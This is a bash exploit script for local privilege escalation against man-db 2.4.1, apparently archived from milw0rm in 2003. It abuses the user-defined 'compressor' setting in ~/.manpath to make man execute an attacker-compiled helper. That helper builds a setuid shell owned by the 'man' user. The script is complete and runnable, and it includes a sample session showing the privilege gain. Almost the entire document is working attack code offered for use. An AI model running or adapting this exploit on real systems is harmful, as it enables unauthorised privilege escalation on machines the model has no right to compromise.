<html><head><title>man-db 2.4.1 open_cat_stream() Local uid=man Exploit
</title></head><pre>#!/bin/bash
# xmandb.sh: shell command file.
#
# man-db[v2.4.1-]: local uid=man exploit.
# by: vade79/v9 v9 fakehalo deadpig org (fakehalo)
#
# open_cat_stream() privileged call exploit.
#
# i've been conversing with the new man-db maintainer, and after the
# initial post sent to bugtraq(which i forgot to inform him), i sent him
# an email highlighting another vulnerability i forgot to mention in the
# original advisory.
#
# once he checked it out, he noticed that the routine never dropped
# privileges before/after the potential buffer/elemental overflow occured,
# and executed the (user defined) &quot;compressor&quot; binary.  making it
# pointless to exploit this via the overflow method, and all-purpose to
# exploit this via the privileged execve() call method.
#
# best of luck to the new maintainer(Colin Watson&lt;cjwatson debian org&gt;),
# he noticed it before i did, so he's on the right track. :)
#
# example:
#  [v9@localhost v9]$ id
#  uid=500(v9) gid=500(v9) groups=500(v9)
#  [v9@localhost v9]$ ./xmandb.sh
#  [*] making fake manpage directories/files...
#  [*] making runme, and mansh source files...
#  [*] compiling runme source...
#  [*] setting &quot;compressor&quot; to: /tmp/runme...
#  [*] executing man-db/man...
#  [*] cleaning up files...
#  [*] success, entering shell.
#  -rws--x---    1 man      v9          13963 Jun 13 20:09 /tmp/mansh
#  sh-2.04$ id
#  uid=15(man) gid=500(v9) groups=500(v9)
#  sh-2.04$ 
#
# (tested on redhat7.1, from src, should work out of the box everywhere)

MANBIN=/usr/bin/man
MANDIR=man_x
TMPDIR=/tmp
echo &quot;man-db[v2.4.1-]: local uid=man exploit.&quot;
echo -e &quot;by: vade79/v9 v9 fakehalo deadpig org (fakehalo)\n&quot;
if [ ! &quot;`$MANBIN -V 2&gt;/dev/null`&quot; ]
then
 echo &quot;[!] \&quot;$MANBIN\&quot; does not appear to be man-db, failed.&quot;
 exit
fi
umask 002
cd $TMPDIR
echo &quot;[*] making fake manpage directories/files...&quot;
mkdir $MANDIR ${MANDIR}/man1 ${MANDIR}/cat1
touch ${MANDIR}/man1/x.1
echo &quot;[*] making runme, and mansh source files...&quot;
cat &lt;&lt;EOF&gt;runme.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
int main(int argc,char **argv){
 setreuid(geteuid(),geteuid());
 system(&quot;cc ${TMPDIR}/mansh.c -o ${TMPDIR}/mansh&quot;);
 chmod(&quot;${TMPDIR}/mansh&quot;,S_ISUID|S_IRUSR|S_IWUSR|S_IXUSR|S_IXGRP);
 unlink(argv[0]);
 exit(0);
}
EOF
cat &lt;&lt;EOF&gt;mansh.c
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
int main(){
 setreuid(geteuid(),geteuid());
 execl(&quot;/bin/sh&quot;,&quot;sh&quot;,0);
 exit(0);
}
EOF
echo &quot;[*] compiling runme source...&quot;
cc runme.c -o runme
echo &quot;[*] setting \&quot;compressor\&quot; to: ${TMPDIR}/runme...&quot;
echo &quot;DEFINE compressor ${TMPDIR}/runme&quot;&gt;~/.manpath
echo &quot;[*] executing man-db/man...&quot;
$MANBIN -M ${TMPDIR}/$MANDIR -P /bin/true x 1&gt;/dev/null 2&gt;&amp;1
echo &quot;[*] cleaning up files...&quot;
rm -rf $MANDIR mansh.c runme.c runme ~/.manpath
if test -u &quot;${TMPDIR}/mansh&quot;
then
 echo &quot;[*] success, entering shell.&quot;
 ls -l ${TMPDIR}/mansh
 ${TMPDIR}/mansh
else
 echo &quot;[!] exploit failed.&quot;
 rm -rf ${TMPDIR}/mansh
fi
exit


// milw0rm.com [2003-08-06]</pre></html>